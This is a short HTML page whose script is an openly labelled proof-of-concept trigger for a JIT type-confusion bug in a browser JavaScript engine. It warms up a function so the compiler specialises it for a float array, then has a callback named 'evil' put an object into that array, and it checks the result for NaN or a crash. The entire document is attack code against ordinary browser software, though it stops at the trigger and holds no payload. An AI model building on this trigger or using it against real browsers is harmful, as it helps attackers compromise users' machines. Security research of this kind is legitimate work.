<!DOCTYPE html>
<script>
  function triggerGhostArray() {
    // Step 1: Create a floating-point array
    let arr = [1.1, 2.2, 3.3, 4.4];
    
    // Step 2: Force JIT optimization
    function confuse(x, callback) {
      let v = x[0];  // JIT assumes 'x' is always Float64
      callback();     // Side effect: Swap array type
      return v + x[1]; // Potential type confusion
    }

    // Step 3: Callback swaps 'arr' to an object array
    function evil() {
      arr[0] = {};   // Corrupt type assumption
    }

    // Step 4: Warm up JIT
    for (let i = 0; i < 100000; i++) {
      confuse(arr, () => {});
    }

    // Step 5: Trigger confusion
    let result = confuse(arr, evil);
    console.log("[!] Result:", result); // Check for NaN/crash
    return result;
  }

  // Run test
  let res = triggerGhostArray();
  document.write("Test completed. Result: " + res);
</script>
